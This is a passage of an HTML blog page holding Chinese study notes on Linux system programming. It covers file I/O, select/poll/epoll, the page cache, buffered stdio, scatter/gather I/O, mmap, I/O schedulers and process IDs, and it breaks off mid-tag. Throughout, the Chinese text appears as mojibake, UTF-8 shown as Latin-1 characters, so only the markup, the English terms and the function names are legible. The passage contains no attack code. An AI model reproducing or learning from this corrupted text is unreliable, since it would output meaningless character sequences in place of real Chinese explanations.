å®šä½è¯»å†™</h2><p>åœ¨è¯»å†™æ“ä½œæ—¶ï¼Œéƒ½æŠŠæ–‡ä»¶ä½ç½®ä½œä¸ºå‚æ•°ï¼Œåœ¨å®Œæˆæ—¶ï¼Œä¸ä¼šæ›´æ–°æ–‡ä»¶ä½ç½®æŒ‡é’ˆã€‚</p><h2 id="2-9-æ–‡ä»¶æˆªçŸ­"><a href="#2-9-æ–‡ä»¶æˆªçŸ­" class="headerlink" title="2.9 æ–‡ä»¶æˆªçŸ­"></a>2.9 æ–‡ä»¶æˆªçŸ­</h2><p>å°†ç»™å®šæ–‡ä»¶æˆªçŸ­ä¸ºå‚æ•°lenæŒ‡å®šçš„é•¿åº¦ã€‚</p><p>å¤§å¤šæ•°çš„è¡Œä¸º:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">æˆåŠŸæ—¶è¿”å›<span class="hljs-number">0</span>,å‡ºé”™æ—¶è¿”å›-<span class="hljs-number">1</span>å¹¶è®¾ç½®ç›¸åº”çš„errnoå€¼.<br></code></pre></td></tr></table></figure><h2 id="2-10-Multiplexed-I-x2F-O"><a href="#2-10-Multiplexed-I-x2F-O" class="headerlink" title="2.10 Multiplexed I&#x2F;O"></a>2.10 Multiplexed I&#x2F;O</h2><p>å…è®¸åº”ç”¨åŒæ—¶åœ¨å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸Šé˜»å¡ï¼Œå¯èƒ½æ„æ€å°±æ˜¯ï¼Œå½“åœ¨ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸Šé˜»å¡æ—¶ï¼Œå¯ä»¥åˆ‡æ¢åˆ°å¤„ç†å¦å¤–ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚</p><p>è®¾è®¡åŸåˆ™:</p><pre><code class="hljs">1. å½“ä»»ä½•ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦I/Oå°±ç»ªæ—¶è¿›è¡Œé€šçŸ¥2. åœ¨æœ‰å¯ç”¨æ–‡ä»¶æè¿°ç¬¦ä¹‹å‰ä¸€ç›´å°±å¤„äºç¡çœ çŠ¶æ€3. å½“æœ‰æ–‡ä»¶æè¿°ç¬¦å¯ç”¨æ—¶å”¤é†’4. å¤„ç†æ‰€æœ‰I/Oå°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæ²¡æœ‰é˜»å¡5. è¿”å›ç¬¬ä¸€æ­¥ï¼Œé‡æ–°å¼€å§‹</code></pre><p>Linuxæœ‰ä¸‰ç§æ–¹æ¡ˆ:select, poll and epoll.</p><h3 id="2-10-1-select"><a href="#2-10-1-select" class="headerlink" title="2.10.1 select()"></a>2.10.1 select()</h3><p>ç›‘æµ‹readfdsé›†åˆä¸­çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯å¦æœ‰å¯ä»¥ä¸é˜»å¡å°±è¯»å–ã€‚</p><p>åœ¨è°ƒç”¨è¿”å›æ—¶ï¼Œå¦‚æœæ–‡ä»¶æè¿°ç¬¦æ¯”å¦‚7è¿˜åœ¨é›†åˆä¸­ï¼Œå®ƒåœ¨I&#x2F;Oè¯»å–æ—¶ä¸ä¼šé˜»å¡.</p><h2 id="2-11-Kernel-Internals"><a href="#2-11-Kernel-Internals" class="headerlink" title="2.11 Kernel Internals"></a>2.11 Kernel Internals</h2><p>å†…æ ¸ä¸­çš„ä¸‰ä¸ªä¸»è¦å­ç³»ç»Ÿ: è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ(VFS), é¡µç¼“å­˜(page cache), é¡µå›å†™(page writeback).</p><h3 id="2-11-1-è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"><a href="#2-11-1-è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="2.11.1 è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"></a>2.11.1 è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</h3><p>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿè°ƒç”¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°å¹¶æ“ä½œæ–‡ä»¶ç³»ç»Ÿçš„æ•°æ®ã€‚</p><p>å…¶ç³»ç»Ÿè°ƒç”¨å¯ä»¥åœ¨ä»»æ„åª’ä»‹çš„ä»»æ„æ–‡ä»¶ç³»ç»Ÿä¸Šè¯»ï¼Œå·¥å…·å¯ä»¥ä»ä»»ä½•ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿæ‹·è´åˆ°å¦ä¸€ä¸ªä¸Š.</p><h3 id="2-11-2-é¡µç¼“å­˜"><a href="#2-11-2-é¡µç¼“å­˜" class="headerlink" title="2.11.2 é¡µç¼“å­˜"></a>2.11.2 é¡µç¼“å­˜</h3><p>ä¸ºä»€ä¹ˆæ˜¯â€é¡µâ€ç¼“å­˜ï¼Œâ€é¡µâ€æ˜¯å†…å­˜å¯»å€çš„æœ€å°å•ä½ã€‚</p><p>å°†æœ€è¿‘åœ¨ç£ç›˜æ–‡ä»¶ç³»ç»Ÿä¸Šè®¿é—®è¿‡çš„æ•°æ®æ”¾åœ¨å†…å­˜ä¸­.</p><p>åˆ©ç”¨äº†â€æ—¶é—´å±€é™æ€§åŸç†â€å³åˆšè¢«è®¿é—®çš„èµ„æºåœ¨ä¸ä¹…åå†æ¬¡è®¿é—®çš„æ¦‚ç‡å¾ˆé«˜ã€‚</p><p>â€œç©ºé—´å±€éƒ¨æ€§â€å³æ•°æ®å¾€å¾€æ˜¯è¿ç»­è®¿é—®çš„ã€‚å°±æ˜¯åœ¨æ¯æ¬¡è¯»å–æ—¶å¤šè¯»å‡ ä¸ªæ¯”ç‰¹.</p><h3 id="2-11-3-é¡µå›å†™"><a href="#2-11-3-é¡µå›å†™" class="headerlink" title="2.11.3 é¡µå›å†™"></a>2.11.3 é¡µå›å†™</h3><p>å°†ç£ç›˜æ–‡ä»¶å’Œå†…å­˜æ•°æ®åŒæ­¥çš„è¿‡ç¨‹ä¸ºâ€å›å†™(writeback)â€.</p><p>è§¦å‘æ¡ä»¶:</p><pre><code class="hljs">1. å½“ç©ºé—²å†…å­˜å°äºé¢„å®šçš„é˜ˆå€¼ï¼Œ&quot;è„&quot;ç¼“å†²åŒºå°±ä¼šå†™é“ç£ç›˜ä¸Šï¼Œè¿™æ ·è¢«æ¸…ç†çš„ç¼“å†²åŒºä¼šè¢«ç§»é™¤ï¼Œé‡Šæ”¾å†…å­˜ç©ºé—´ã€‚2. å½“&quot;è„&quot;ç¼“å†²åŒºçš„æ—¶é•¿è¶…è¿‡é¢„å®šçš„é˜ˆå€¼æ—¶ï¼Œè¯¥ç¼“å†²åŒºå°±ä¼šå†™åˆ°ç£ç›˜ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥é¿å…æ•°æ®ä¸€ç›´æ˜¯&quot;è„&quot;æ•°æ®ã€‚</code></pre><p>å»¶è¿Ÿå†™åœ¨ç”µæºå‡ºæ•…éšœæ—¶å¯èƒ½ä¼šä¸¢å¤±æ•°æ®ã€‚</p><h1 id="ç¬¬ä¸‰ç« -ç¼“å†²I-x2F-O"><a href="#ç¬¬ä¸‰ç« -ç¼“å†²I-x2F-O" class="headerlink" title="ç¬¬ä¸‰ç«  ç¼“å†²I&#x2F;O"></a>ç¬¬ä¸‰ç«  ç¼“å†²I&#x2F;O</h1><p>å—æ˜¯I&#x2F;Oä¸­çš„åŸºæœ¬æ¦‚å¿µã€‚</p><p>ä¹Ÿè®¸ä½ åªæƒ³è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œå®é™…ä¸Šè¦è¯»å–æ•´ä¸ªå—.</p><h2 id="3-1-ç”¨æˆ·ç¼“å†²I-x2F-O"><a href="#3-1-ç”¨æˆ·ç¼“å†²I-x2F-O" class="headerlink" title="3.1 ç”¨æˆ·ç¼“å†²I&#x2F;O"></a>3.1 ç”¨æˆ·ç¼“å†²I&#x2F;O</h2><p><mark>åªæœ‰å½“æ•°æ®é‡å¤§å°è¾¾åˆ°æ–‡ä»¶ç³»ç»Ÿå—å¤§å°çš„æ•´æ•°å€æ—¶ï¼Œæ‰ä¼šæ‰§è¡ŒçœŸæ­£çš„I&#x2F;Oæ“ä½œã€‚</mark></p><p>ä¸ºäº†åˆ©ç”¨æ€§èƒ½æå‡çš„ä¼˜åŠ¿ï¼Œéœ€è¦é¢„å…ˆäº†è§£ç‰©ç†å¿«å¤§å°ï¼Œå—å¤§å°ä¸æ˜¯ç£ç›˜å—çš„æ•´æ•°å€ä¼šå¯¼è‡´ä¸å¯¹é½æ“ä½œã€‚</p><h2 id="3-2-æ ‡å‡†I-x2F-O"><a href="#3-2-æ ‡å‡†I-x2F-O" class="headerlink" title="3.2 æ ‡å‡†I&#x2F;O"></a>3.2 æ ‡å‡†I&#x2F;O</h2><p>å®ç°äº†è·¨å¹³å°çš„ç”¨æˆ·ç¼“å†²è§£å†³æ–¹æ¡ˆã€‚</p><h3 id="æ–‡ä»¶æŒ‡é’ˆ"><a href="#æ–‡ä»¶æŒ‡é’ˆ" class="headerlink" title="æ–‡ä»¶æŒ‡é’ˆ"></a>æ–‡ä»¶æŒ‡é’ˆ</h3><p>æ ‡å‡†I&#x2F;Oç¨‹åºé›†é€šè¿‡æ“ä½œæ–‡ä»¶æŒ‡é’ˆ(file pointer)ï¼Œæ–‡ä»¶æŒ‡é’ˆå’Œæ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸€ä¸€æ˜ å°„ã€‚</p><p>æ–‡ä»¶æŒ‡é’ˆæ˜¯ç”±æŒ‡å‘ç±»å‹å®šä¹‰FILEçš„æŒ‡é’ˆè¡¨ç¤ºï¼Œå…¶å®šä¹‰åœ¨&lt;stdio.h&gt;ä¸­ã€‚</p><h4 id="FILEä¸ºä»€ä¹ˆå…¨éƒ¨å¤§å†™"><a href="#FILEä¸ºä»€ä¹ˆå…¨éƒ¨å¤§å†™" class="headerlink" title="FILEä¸ºä»€ä¹ˆå…¨éƒ¨å¤§å†™"></a>FILEä¸ºä»€ä¹ˆå…¨éƒ¨å¤§å†™</h4><p>å†å²é—ç•™åŸå› ï¼Œä»¥å‰é€šè¿‡å®å®ç°ã€‚</p><p>åœ¨æ ‡å‡†I&#x2F;Oä¸­ï¼Œæ‰“å¼€çš„æ–‡ä»¶ç§°ä¸ºâ€æµ(stream)â€. </p><p>è¾“å…¥æµï¼Œåº”è¯¥çœ‹ä½œè¾“å…¥åˆ°æµã€‚</p><h2 id="3-3-æ‰“å¼€æ–‡ä»¶"><a href="#3-3-æ‰“å¼€æ–‡ä»¶" class="headerlink" title="3.3 æ‰“å¼€æ–‡ä»¶"></a>3.3 æ‰“å¼€æ–‡ä»¶</h2><p>é€šè¿‡<code>fopen()</code>.</p><p><code>fopen()</code>æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œè¿”å›ä¸€ä¸ªåˆæ³•çš„FILEæŒ‡é’ˆï¼Œå¤±è´¥æ—¶ï¼Œè¿”å›NULL,å¹¶ç›¸åº”è®¾ç½®errnoå€¼.</p><h2 id="3-4-é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æ‰“å¼€æµ"><a href="#3-4-é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æ‰“å¼€æµ" class="headerlink" title="3.4 é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æ‰“å¼€æµ"></a>3.4 é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æ‰“å¼€æµ</h2><p>é€šè¿‡<code>fdopen()</code>æŠŠä¸€ä¸ªå·²ç»æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦(fd)è½¬æ¢æˆæµã€‚</p><h2 id="3-5-å…³é—­æµ"><a href="#3-5-å…³é—­æµ" class="headerlink" title="3.5 å…³é—­æµ"></a>3.5 å…³é—­æµ</h2><p>ä½¿ç”¨<code>fclose()</code>å‡½æ•°ã€‚</p><p>æˆåŠŸæ—¶è¿”å›0, å¤±è´¥æ—¶è¿”å›EOFå¹¶ä¸”ç›¸åº”çš„è®¾ç½®errno.</p><p>è®¨è®ºäº†ä¸‰ä¸ªè¯»å†™æ–¹å¼: å•ä¸ªå­—ç¬¦ï¼Œå­—ç¬¦ä¸²ï¼ŒäºŒè¿›åˆ¶.</p><h2 id="3-6-å‘æµä¸­å†™æ•°æ®"><a href="#3-6-å‘æµä¸­å†™æ•°æ®" class="headerlink" title="3.6 å‘æµä¸­å†™æ•°æ®"></a>3.6 å‘æµä¸­å†™æ•°æ®</h2><h3 id="3-6-1-å¯¹é½çš„è®¨è®º"><a href="#3-6-1-å¯¹é½çš„è®¨è®º" class="headerlink" title="3.6.1 å¯¹é½çš„è®¨è®º"></a>3.6.1 å¯¹é½çš„è®¨è®º</h3><p>æ‰€æœ‰çš„æœºå™¨è®¾è®¡éƒ½æœ‰æ•°æ®å¯¹é½çš„è¦æ±‚ã€‚</p><p>å¤„ç†å™¨éƒ½ä»¥ç‰¹å®šçš„ç²’åº¦æ¥è®¿é—®å†…å­˜, ä¾‹å¦‚2, 4, 8 æˆ– 16å­—èŠ‚ã€‚</p><p>ç¼–è¯‘å™¨è‡ªåŠ¨å¯¹å…¶æ•°æ®.</p><p>å› ä¸ºå˜é‡é•¿åº¦ã€å¯¹é½ç­‰ç­‰çš„ä¸åŒï¼Œä¸€ä¸ªç¨‹åºå†™å…¥çš„äºŒè¿›åˆ¶æ•°æ®å¯¹äºå¦å¤–ä¸€ä¸ªç¨‹åºå¯èƒ½æ˜¯ä¸å¯è¯»çš„ã€‚</p><h2 id="3-7-å®šä½æµ"><a href="#3-7-å®šä½æµ" class="headerlink" title="3.7 å®šä½æµ"></a>3.7 å®šä½æµ</h2><p><code>fseek()</code>å‡½æ•°ï¼Œæ“çºµæµæŒ‡å‘æ–‡ä»¶ä¸­ç”±offsetå’ŒwhenceæŒ‡å®šçš„ä½ç½®ã€‚</p><p><code>rewind()</code>å‡½æ•°ï¼Œå°†ä½ç½®é‡ç½®åˆ°æµåˆå§‹ä½ç½®.</p><p>ç†è§£Cå‡½æ•°åº“ç»´æŒçš„ç¼“å†²åŒºå’Œå†…æ ¸æ‹¥æœ‰çš„ç¼“å†²åŒºçš„åŒºåˆ«ã€‚å‰è€…ä¿ç•™åœ¨ç”¨æˆ·ç©ºé—´ä¸­ã€‚</p><h2 id="3-10-æ§åˆ¶ç¼“å†²"><a href="#3-10-æ§åˆ¶ç¼“å†²" class="headerlink" title="3.10 æ§åˆ¶ç¼“å†²"></a>3.10 æ§åˆ¶ç¼“å†²</h2><p>ä¸€äº›é€‰é¡¹:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">ä¸ç¼“å†²ï¼Œæ•°æ®ç›´æ¥æäº¤åˆ°å†…æ ¸<br><br>è¡Œç¼“å†²ï¼Œæ¯å½“é‡åˆ°æ¢è¡Œç¬¦ï¼Œç¼“å†²åŒºè¢«æäº¤åˆ°å†…æ ¸<br><br>å—ç¼“å†²ï¼Œé€‚ç”¨äºæ–‡ä»¶ï¼Œé»˜è®¤çš„æ‰€æœ‰çš„å’Œæ–‡ä»¶ç›¸å…³çš„æµéƒ½æ˜¯å—ç¼“å†²<br></code></pre></td></tr></table></figure><p>æµæ˜¯ä¸æ˜¯ä¸€ä¸ªç¼“å†²åŒºã€‚</p><h2 id="3-11-çº¿ç¨‹å®‰å…¨"><a href="#3-11-çº¿ç¨‹å®‰å…¨" class="headerlink" title="3.11 çº¿ç¨‹å®‰å…¨"></a>3.11 çº¿ç¨‹å®‰å…¨</h2><p>çº¿ç¨‹çš„å®šä¹‰æ˜¯å…±äº«ç»Ÿä¸€åœ°å€ç©ºé—´çš„å¤šä¸ªè¿›ç¨‹ã€‚</p><p>ä¸€ä¸ªçº¿ç¨‹è¦æƒ³æ‰§è¡Œä»»ä½•I&#x2F;Oè¯·æ±‚ï¼Œå¿…é¡»é¦–å…ˆè·å¾—é”å¹¶ä¸”æˆä¸ºæ‰€æœ‰è€…çº¿ç¨‹ã€‚</p><h1 id="ç¬¬å››ç« -é«˜çº§æ–‡ä»¶I-x2F-O"><a href="#ç¬¬å››ç« -é«˜çº§æ–‡ä»¶I-x2F-O" class="headerlink" title="ç¬¬å››ç«  é«˜çº§æ–‡ä»¶I&#x2F;O"></a>ç¬¬å››ç«  é«˜çº§æ–‡ä»¶I&#x2F;O</h1><p>Linuxæä¾›çš„é«˜çº§I&#x2F;Oç³»ç»Ÿè°ƒç”¨:</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">æ•£å¸ƒ<span class="hljs-operator">/</span>èšé›†<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Scatter</span><span class="hljs-operator">/</span><span class="hljs-variable">gather</span> <span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span><span class="hljs-punctuation">)</span><br><br><span class="hljs-variable">epoll</span><br><br>å†…å­˜æ˜ å°„<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span><br><br>æ–‡ä»¶<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span>æç¤º<br><br>å¼‚æ­¥<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span><br></code></pre></td></tr></table></figure><h2 id="4-1-æ•£æ­¥-x2F-èšé›†I-x2F-O"><a href="#4-1-æ•£æ­¥-x2F-èšé›†I-x2F-O" class="headerlink" title="4.1 æ•£æ­¥&#x2F;èšé›†I&#x2F;O"></a>4.1 æ•£æ­¥&#x2F;èšé›†I&#x2F;O</h2><p>å‘½ååŸç”±ï¼Œæ•°æ®è¢«æ•£å¸ƒåˆ°ä¸€ä¸ªç¼“å†²åŒºå‘é‡ï¼Œæˆ–è€…ä»ä¸€ä¸ªç¼“å†²åŒºå‘é‡èšé›†.</p><p>å…¶åœ¨å•æ¬¡ç³»ç»Ÿè°ƒç”¨ä¸­æ“ä½œå¤šä¸ªç¼“å†²åŒºçš„I&#x2F;O.</p><p>æ¯ä¸ªiovecç»“æ„ä½“æè¿°ä¸€ä¸ªç‹¬ç«‹çš„ç¼“å†²åŒºï¼Œæˆ‘ä»¬ç§°å…¶ä¸ºæ®µ(segment).</p><p>ä¸€ç»„segmentçš„é›†åˆç§°ä¸ºå‘é‡(vector). æ¯ä¸ªæ®µæè¿°äº†æ‰€è¦è¯»å†™çš„ç¼“å†²åŒºçš„åœ°å€å’Œé•¿åº¦ã€‚</p><h2 id="4-2-Event-Pollæ¥å£"><a href="#4-2-Event-Pollæ¥å£" class="headerlink" title="4.2 Event Pollæ¥å£"></a>4.2 Event Pollæ¥å£</h2><p>Event Poll(epoll)æœºåˆ¶ã€‚p96</p><h3 id="4-2-4-è¾¹æ²¿è§¦å‘äº‹ä»¶å’Œæ°´å¹³è§¦å‘äº‹ä»¶"><a href="#4-2-4-è¾¹æ²¿è§¦å‘äº‹ä»¶å’Œæ°´å¹³è§¦å‘äº‹ä»¶" class="headerlink" title="4.2.4 è¾¹æ²¿è§¦å‘äº‹ä»¶å’Œæ°´å¹³è§¦å‘äº‹ä»¶"></a>4.2.4 è¾¹æ²¿è§¦å‘äº‹ä»¶å’Œæ°´å¹³è§¦å‘äº‹ä»¶</h3><p>æ°´å¹³å‡ºå‘ï¼Œåœ¨ä¸€ä¸ªçŠ¶æ€å‘ç”Ÿæ—¶è§¦å‘ã€‚</p><p>è¾¹æ²¿è§¦å‘ï¼ŒçŠ¶æ€æ”¹å˜æ—¶äº§ç”Ÿã€‚</p><h2 id="4-3-å­˜å‚¨æ˜ å°„"><a href="#4-3-å­˜å‚¨æ˜ å°„" class="headerlink" title="4.3 å­˜å‚¨æ˜ å°„"></a>4.3 å­˜å‚¨æ˜ å°„</h2><p>é™¤æ ‡å‡†I&#x2F;Oä¹‹å¤–çš„å¦ä¸€ç§I&#x2F;Oæ–¹å¼ï¼Œåº”ç”¨ç¨‹åºå°†æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚</p><h3 id="4-3-1-1-é¡µå¤§å°"><a href="#4-3-1-1-é¡µå¤§å°" class="headerlink" title="4.3.1.1 é¡µå¤§å°"></a>4.3.1.1 é¡µå¤§å°</h3><p>é¡µæ˜¯å†…å­˜æ˜ å°„çš„åŸºæœ¬å—ï¼ŒåŒæ—¶ä¹Ÿæ˜¯è¿›ç¨‹åœ°å€ç©ºé—´çš„åŸºæœ¬å—ã€‚</p><p>mmap()åœ¨å¤„ç†å¤§æ–‡ä»¶ï¼Œæˆ–è€…åœ¨æ–‡ä»¶çš„å¤§å°æ°å¥½è¢«pageå¤§å°æ•´é™¤æ—¶ä¼˜åŠ¿æ˜æ˜¾ã€‚</p><h2 id="4-5-Synchronized-Synchronous-and-Asynchronous-Operations"><a href="#4-5-Synchronized-Synchronous-and-Asynchronous-Operations" class="headerlink" title="4.5 Synchronized, Synchronous, and Asynchronous Operations"></a>4.5 Synchronized, Synchronous, and Asynchronous Operations</h2><p>Synchronouså†™æ“ä½œåœ¨æ•°æ®å…¨éƒ¨å†™åˆ°å†…æ ¸ç¼“å†²åŒºä¹‹å‰æ˜¯ä¸ä¼šè¿”å›çš„ã€‚</p><p>Asynchronouså†™æ“ä½œåœ¨ç”¨æˆ·ç©ºé—´è¿˜æœ‰æ•°æ®æ—¶å¯èƒ½å°±è¿”å›äº†ã€‚</p><h2 id="4-6-I-x2F-Oè°ƒåº¦å™¨å’ŒI-x2F-Oæ€§èƒ½"><a href="#4-6-I-x2F-Oè°ƒåº¦å™¨å’ŒI-x2F-Oæ€§èƒ½" class="headerlink" title="4.6 I&#x2F;Oè°ƒåº¦å™¨å’ŒI&#x2F;Oæ€§èƒ½"></a>4.6 I&#x2F;Oè°ƒåº¦å™¨å’ŒI&#x2F;Oæ€§èƒ½</h2><p>ç¡¬ç›˜å’Œç³»ç»Ÿä¸­å…¶ä»–éƒ¨åˆ†çš„æ€§èƒ½å·®è·æ¯”è¾ƒå¤§ã€‚</p><p>I&#x2F;Oè°ƒåº¦å™¨å°½åŠ›å°†ç¡¬ç›˜è®¿é—®çš„æ€§èƒ½æŸå¤±æ§åˆ¶åœ¨æœ€å°ã€‚</p><p>ç¡¬ç›˜åŸºäºæŸ±é¢(cylinders), ç£å¤´(heads), å’Œæ‰‡åŒº(section)çš„å‡ ä½•å¯»å€æ–¹å¼ï¼Œç§°CHSå¯»å€ã€‚</p><p>ç°ä»£ç³»ç»Ÿé€šè¿‡å—å·ä¸CHSåœ°å€çš„æ˜ å°„å¯»å€ã€‚</p><h3 id="4-6-2-è°ƒåº¦å™¨åŠŸèƒ½"><a href="#4-6-2-è°ƒåº¦å™¨åŠŸèƒ½" class="headerlink" title="4.6.2 è°ƒåº¦å™¨åŠŸèƒ½"></a>4.6.2 è°ƒåº¦å™¨åŠŸèƒ½</h3><p>å®ç°ä¸¤ä¸ªåŸºæœ¬æ“ä½œ: </p><pre><code class="hljs">1. åˆå¹¶(merging), å°†ä¸¤ä¸ªæˆ–å¤šä¸ªç›¸é‚»çš„I/Oè¯·æ±‚çš„è¿‡ç¨‹åˆå¹¶ä¸ºä¸€ä¸ªã€‚2. æ’åº(sorting), é€‰å–ä¸¤ä¸ªæ“ä½œä¸­ç›¸å¯¹æ›´é‡è¦çš„ä¸€ä¸ªï¼Œå¹¶æŒ‰å—å·é€’å¢çš„é¡ºåºé‡æ–°å®‰æ’ç­‰å¾…çš„I/Oè¯·æ±‚ã€‚</code></pre><h3 id="4-6-3-æ”¹è¿›è¯»è¯·æ±‚"><a href="#4-6-3-æ”¹è¿›è¯»è¯·æ±‚" class="headerlink" title="4.6.3 æ”¹è¿›è¯»è¯·æ±‚"></a>4.6.3 æ”¹è¿›è¯»è¯·æ±‚</h3><h4 id="4-6-3-1-Deadlineç®—æ³•"><a href="#4-6-3-1-Deadlineç®—æ³•" class="headerlink" title="4.6.3.1 Deadlineç®—æ³•"></a>4.6.3.1 Deadlineç®—æ³•</h4><p>åœ¨I&#x2F;Oè¯·æ±‚ä¸ŠåŠ å…¥äº†æœ€åæœŸé™ï¼Œè°ƒåº¦å™¨æ˜¯ä¸€ä¸ªç¨‹åºã€‚</p><h4 id="4-6-3-2-Anticipatoryç®—æ³•"><a href="#4-6-3-2-Anticipatoryç®—æ³•" class="headerlink" title="4.6.3.2 Anticipatoryç®—æ³•"></a>4.6.3.2 Anticipatoryç®—æ³•</h4><p>å’Œ Deadline ä¸€æ ·å¼€å§‹ï¼Œä½†å…·æœ‰é¢„æµ‹æœºåˆ¶ã€‚</p><h4 id="4-6-3-3-CFQ-I-x2F-Oè°ƒåº¦å™¨"><a href="#4-6-3-3-CFQ-I-x2F-Oè°ƒåº¦å™¨" class="headerlink" title="4.6.3.3 CFQ I&#x2F;Oè°ƒåº¦å™¨"></a>4.6.3.3 CFQ I&#x2F;Oè°ƒåº¦å™¨</h4><h4 id="4-6-3-4-Noop-I-x2F-Oè°ƒåº¦å™¨"><a href="#4-6-3-4-Noop-I-x2F-Oè°ƒåº¦å™¨" class="headerlink" title="4.6.3.4 Noop I&#x2F;Oè°ƒåº¦å™¨"></a>4.6.3.4 Noop I&#x2F;Oè°ƒåº¦å™¨</h4><h3 id="4-6-4-é€‰æ‹©å’Œé…ç½®ä½ çš„I-x2F-Oè°ƒåº¦å™¨"><a href="#4-6-4-é€‰æ‹©å’Œé…ç½®ä½ çš„I-x2F-Oè°ƒåº¦å™¨" class="headerlink" title="4.6.4 é€‰æ‹©å’Œé…ç½®ä½ çš„I&#x2F;Oè°ƒåº¦å™¨"></a>4.6.4 é€‰æ‹©å’Œé…ç½®ä½ çš„I&#x2F;Oè°ƒåº¦å™¨</h3><p>ç›®å½•<code>/sys/block/device/queue/iosched</code></p><h3 id="4-6-5-ä¼˜åŒ–I-x2F-Oæ€§èƒ½"><a href="#4-6-5-ä¼˜åŒ–I-x2F-Oæ€§èƒ½" class="headerlink" title="4.6.5 ä¼˜åŒ–I&#x2F;Oæ€§èƒ½"></a>4.6.5 ä¼˜åŒ–I&#x2F;Oæ€§èƒ½</h3><h4 id="4-6-5-1-ç”¨æˆ·ç©ºé—´I-x2F-Oè°ƒåº¦"><a href="#4-6-5-1-ç”¨æˆ·ç©ºé—´I-x2F-Oè°ƒåº¦" class="headerlink" title="4.6.5.1 ç”¨æˆ·ç©ºé—´I&#x2F;Oè°ƒåº¦"></a>4.6.5.1 ç”¨æˆ·ç©ºé—´I&#x2F;Oè°ƒåº¦</h4><p>ä»¥æœ‰åˆ©äºå¯»å€æ“ä½œçš„é¡ºåºæäº¤, å¯æŒ‰ç…§ä»¥ä¸‹æ–¹å¼:</p><pre><code class="hljs">1. å®Œæ•´è·¯å¾„2. inodeç¼–å·3. æ–‡ä»¶çš„ç‰©ç†å—</code></pre><p>æ–‡ä»¶içš„inodeåºå· &lt; æ–‡ä»¶jçš„inodeå·</p><p>é€šå¸¸æ„å‘³ç€ï¼š</p><p>æ–‡ä»¶içš„ç‰©ç†å— &lt; æ–‡ä»¶jçš„ç‰©ç†å—</p><h1 id="ç¬¬äº”ç« -è¿›ç¨‹ç®¡ç†"><a href="#ç¬¬äº”ç« -è¿›ç¨‹ç®¡ç†" class="headerlink" title="ç¬¬äº”ç«  è¿›ç¨‹ç®¡ç†"></a>ç¬¬äº”ç«  è¿›ç¨‹ç®¡ç†</h1><p>è¿›ç¨‹æ˜¯UNIXç³»ç»Ÿä¸­ä»…æ¬¡äºæ–‡ä»¶çš„åŸºæœ¬æŠ½è±¡æ¦‚å¿µ.</p><p>è¿›ç¨‹ä¸ä»…ä»…åŒ…å«æ±‡ç¼–ä»£ç ï¼Œå®ƒç”±æ•°æ®ã€èµ„æºã€çŠ¶æ€å’Œä¸€ä¸ªè™šæ‹Ÿçš„è®¡ç®—æœºç»„æˆã€‚</p><h2 id="5-1-è¿›ç¨‹ID"><a href="#5-1-è¿›ç¨‹ID" class="headerlink" title="5.1 è¿›ç¨‹ID"></a>5.1 è¿›ç¨‹ID</h2><p>ç®€ç§°pid.</p><p>æœ¬è´¨ä¸Šå°†ï¼Œå¤§å¤šæ•°ä»£ç ä¼šå‡è®¾å†…æ ¸ä¸ä¼šé‡ç”¨å·²ç»ç”¨è¿‡çš„pidå€¼ã€‚</p><p>ç©ºé—²è¿›ç¨‹(idle process)ï¼Œå½“æ²¡æœ‰å…¶ä»–è¿›ç¨‹è¿è¡Œæ—¶ï¼Œå†…æ ¸æ‰€è¿è¡Œçš„è¿›ç¨‹ï¼Œå…¶pidæ˜¯0.</p><p>å†…æ ¸å¿…é¡»å¯»æ‰¾ä¸€ä¸ªé€‚åˆçš„initç¨‹åºã€‚<br>æŸ¥æ‰¾ä½ç½®å’Œé¡ºåº:</p><pre><code class="hljs">1. /sbin/init2. /etc/init3. /bin/init4. /bin/sh, å½“å†…æ ¸æ²¡æœ‰æ‰¾åˆ°initæ—¶ï¼Œå†…æ ¸ä¼šå°è¯•è¿è¡Œå®ƒ.</code></pre><p>æ‰€ä»¥å†…æ ¸ä¼¼ä¹ä¹Ÿå°±æ˜¯ä¸ªç¨‹åºã€‚</p><h3 id="5-1-1-åˆ†é…è¿›ç¨‹ID"><a 